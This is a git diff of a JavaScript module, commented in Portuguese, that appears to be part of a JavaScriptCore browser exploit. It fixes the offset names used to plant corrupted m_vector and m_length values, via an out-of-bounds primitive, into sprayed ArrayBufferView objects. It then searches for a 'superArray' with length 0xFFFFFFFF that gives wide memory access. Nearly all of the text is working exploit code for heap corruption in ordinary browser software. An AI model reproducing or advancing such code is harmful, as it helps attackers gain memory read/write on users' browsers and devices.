@@ -12,7 +12,7 @@ import {
 import { JSC_OFFSETS } from '../config.mjs';
 
 // ============================================================\n// DEFINIÇÕES DE CONSTANTES GLOBAIS DO MÓDULO\n// ============================================================
-const FNAME_SPRAY_INVESTIGATE = "sprayAndCorruptABView_v9_debugNaN"; // Nome atualizado para depuração
+const FNAME_SPRAY_INVESTIGATE = "sprayAndCorruptABView_v10_fixOffsets"; // Nome atualizado
 
 const CORRUPTION_OFFSET_TRIGGER = 0x70;
 const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
@@ -28,7 +28,7 @@ const CORRUPTION_VALUE_UINT32_FFFFFFFF = 0xFFFFFFFF;
 let sprayedVictimObjects = [];
 
 export async function sprayAndInvestigateObjectExposure() {
-    logS3(`--- Iniciando ${FNAME_SPRAY_INVESTIGATE}: Corromper ABView e Depurar Offsets NaN ---`, "test", FNAME_SPRAY_INVESTIGATE);
+    logS3(`--- Iniciando ${FNAME_SPRAY_INVESTIGATE}: Corromper ABView com Offsets Corrigidos ---`, "test", FNAME_SPRAY_INVESTIGATE);
 
     try {
         await triggerOOB_primitive();
@@ -52,30 +52,22 @@ export async function sprayAndInvestigateObjectExposure() {
         // FASE 2: Plantar valores no oob_array_buffer_real
         logS3(`FASE 2: Plantando futuros metadados (m_vector=0, m_length=0xFFFFFFFF) no oob_array_buffer_real...`, "info", FNAME_SPRAY_INVESTIGATE);
 
-        // ==== LOGS DE DEPURAÇÃO ADICIONADOS ====
+        // ==== CORREÇÃO: Usar M_VECTOR_OFFSET e M_LENGTH_OFFSET ====
         logS3(`  DEBUG PRE-CALC: FOCUSED_VICTIM_ABVIEW_START_OFFSET = ${toHex(FOCUSED_VICTIM_ABVIEW_START_OFFSET)} (tipo: ${typeof FOCUSED_VICTIM_ABVIEW_START_OFFSET})`, "info", FNAME_SPRAY_INVESTIGATE);
         logS3(`  DEBUG PRE-CALC: JSC_OFFSETS = ${JSC_OFFSETS ? 'DEFINIDO' : 'INDEFINIDO'}`, "info", FNAME_SPRAY_INVESTIGATE);
-        if (JSC_OFFSETS) {
-            logS3(`  DEBUG PRE-CALC: JSC_OFFSETS.ArrayBufferView = ${JSC_OFFSETS.ArrayBufferView ? 'DEFINIDO' : 'INDEFINIDO'}`, "info", FNAME_SPRAY_INVESTIGATE);
-            if (JSC_OFFSETS.ArrayBufferView) {
-                logS3(`  DEBUG PRE-CALC: JSC_OFFSETS.ArrayBufferView.VECTOR_OFFSET = ${JSC_OFFSETS.ArrayBufferView.VECTOR_OFFSET} (tipo: ${typeof JSC_OFFSETS.ArrayBufferView.VECTOR_OFFSET}) -> Hex: ${toHex(JSC_OFFSETS.ArrayBufferView.VECTOR_OFFSET)}`, "info", FNAME_SPRAY_INVESTIGATE);
-                logS3(`  DEBUG PRE-CALC: JSC_OFFSETS.ArrayBufferView.LENGTH_OFFSET = ${JSC_OFFSETS.ArrayBufferView.LENGTH_OFFSET} (tipo: ${typeof JSC_OFFSETS.ArrayBufferView.LENGTH_OFFSET}) -> Hex: ${toHex(JSC_OFFSETS.ArrayBufferView.LENGTH_OFFSET)}`, "info", FNAME_SPRAY_INVESTIGATE);
-            } else {
-                logS3("  ERRO DEBUG: JSC_OFFSETS.ArrayBufferView é INDEFINIDO!", "error", FNAME_SPRAY_INVESTIGATE);
-            }
+        if (JSC_OFFSETS && JSC_OFFSETS.ArrayBufferView) {
+            logS3(`  DEBUG PRE-CALC: JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET = ${JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET} (tipo: ${typeof JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET}) -> Hex: ${toHex(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET)}`, "info", FNAME_SPRAY_INVESTIGATE);
+            logS3(`  DEBUG PRE-CALC: JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET = ${JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET} (tipo: ${typeof JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET}) -> Hex: ${toHex(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET)}`, "info", FNAME_SPRAY_INVESTIGATE);
         } else {
-            logS3("  ERRO DEBUG: JSC_OFFSETS é INDEFINIDO!", "error", FNAME_SPRAY_INVESTIGATE);
+            logS3("  ERRO DEBUG: JSC_OFFSETS.ArrayBufferView é INDEFINIDO ou JSC_OFFSETS é INDEFINIDO!", "error", FNAME_SPRAY_INVESTIGATE);
         }
-        // ==== FIM DOS LOGS DE DEPURAÇÃO ADICIONADOS ====
 
-        const targetVectorOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET + (JSC_OFFSETS && JSC_OFFSETS.ArrayBufferView ? JSC_OFFSETS.ArrayBufferView.VECTOR_OFFSET : NaN);
-        const targetLengthOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET + (JSC_OFFSETS && JSC_OFFSETS.ArrayBufferView ? JSC_OFFSETS.ArrayBufferView.LENGTH_OFFSET : NaN);
+        const targetVectorOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET + (JSC_OFFSETS && JSC_OFFSETS.ArrayBufferView ? JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET : NaN);
+        const targetLengthOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET + (JSC_OFFSETS && JSC_OFFSETS.ArrayBufferView ? JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET : NaN);
+        // ==== FIM DA CORREÇÃO E LOGS DE DEBUG ====
         
-        // ==== LOGS DE DEPURAÇÃO PÓS-CÁLCULO ====
         logS3(`  DEBUG POST-CALC: targetVectorOffset = ${targetVectorOffset} (tipo: ${typeof targetVectorOffset}) -> Hex: ${toHex(targetVectorOffset)}`, "info", FNAME_SPRAY_INVESTIGATE);
         logS3(`  DEBUG POST-CALC: targetLengthOffset = ${targetLengthOffset} (tipo: ${typeof targetLengthOffset}) -> Hex: ${toHex(targetLengthOffset)}`, "info", FNAME_SPRAY_INVESTIGATE);
-        // ==== FIM DOS LOGS DE DEPURAÇÃO PÓS-CÁLCULO ====
-
 
         logS3(`  Plantando futuro m_vector (0) em oob_buffer[${toHex(targetVectorOffset)}]`, "info", FNAME_SPRAY_INVESTIGATE);
         if (!isNaN(targetVectorOffset)) {
@@ -90,7 +82,6 @@ export async function sprayAndInvestigateObjectExposure() {
         } else {
             logS3("  ERRO: targetLengthOffset é NaN. Escrita de m_length abortada.", "error", FNAME_SPRAY_INVESTIGATE);
         }
-
 
         logS3("Valores plantados ANTES da corrupção trigger:", "info", FNAME_SPRAY_INVESTIGATE);
         if (!isNaN(targetVectorOffset) && !isNaN(targetLengthOffset)) {
@@ -132,7 +123,7 @@ export async function sprayAndInvestigateObjectExposure() {
         // FASE 5: Tentar identificar o 'superArray'
         logS3(`FASE 5: Tentando identificar o 'superArray' pela sua propriedade 'length'...`, "info", FNAME_SPRAY_INVESTIGATE);
         let foundSuperArrayIndex = -1;
-        if (!isNaN(targetVectorOffset) && !isNaN(targetLengthOffset)) { // Só tenta se os offsets foram válidos
+        if (!isNaN(targetVectorOffset) && !isNaN(targetLengthOffset)) {
             for (let i = 0; i < sprayedVictimObjects.length; i++) {
                 if (sprayedVictimObjects[i] && sprayedVictimObjects[i].length === CORRUPTION_VALUE_UINT32_FFFFFFFF) {
                     foundSuperArrayIndex = i;
@@ -143,7 +134,6 @@ export async function sprayAndInvestigateObjectExposure() {
             logS3("    Identificação do superArray abortada pois targetOffsets eram NaN (setup da corrupção falhou).", "error", FNAME_SPRAY_INVESTIGATE);
         }
         
-
         if (foundSuperArrayIndex !== -1) {
             const superArray = sprayedVictimObjects[foundSuperArrayIndex];
             logS3(`    !!! 'superArray' IDENTIFICADO no índice ${foundSuperArrayIndex} (length: ${superArray.length}) !!!`, "vuln", FNAME_SPRAY_INVESTIGATE);
@@ -170,11 +160,11 @@ export async function sprayAndInvestigateObjectExposure() {
                 document.title = "SuperArray ERRO LEITURA!";
             }
         } else {
-            if (!isNaN(targetVectorOffset) && !isNaN(targetLengthOffset)) { // Só loga falha se o setup não foi NaN
+            if (!isNaN(targetVectorOffset) && !isNaN(targetLengthOffset)) { 
                 logS3("    Falha em identificar o 'superArray' pela propriedade 'length'. Nenhum array pulverizado tem length 0xFFFFFFFF.", "error", FNAME_SPRAY_INVESTIGATE);
                 logS3("    Isso pode significar que a corrupção do objeto JS na heap não ocorreu como esperado, ou o objeto corrompido não era um dos pulverizados.", "error", FNAME_SPRAY_INVESTIGATE);
             }
-            document.title = "SuperArray NÃO Encontrado (possivelmente devido a erro de offset)!";
+            document.title = "SuperArray NÃO Encontrado!";
         }
 
         logS3("INVESTIGAÇÃO DETALHADA COM SPRAY CONCLUÍDA.", "test", FNAME_SPRAY_INVESTIGATE);
